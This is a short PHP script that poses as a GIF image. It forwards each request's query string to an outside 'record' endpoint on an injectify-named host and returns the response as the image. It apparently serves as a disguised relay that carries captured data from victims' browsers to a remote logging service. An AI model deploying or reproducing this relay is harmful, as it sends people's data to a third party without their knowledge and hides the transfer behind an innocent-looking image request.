<?php
    header("Content-type: image/gif");
    echo file_get_contents("https://injectify.samdd.me/record/" . $_SERVER['QUERY_STRING']);
?>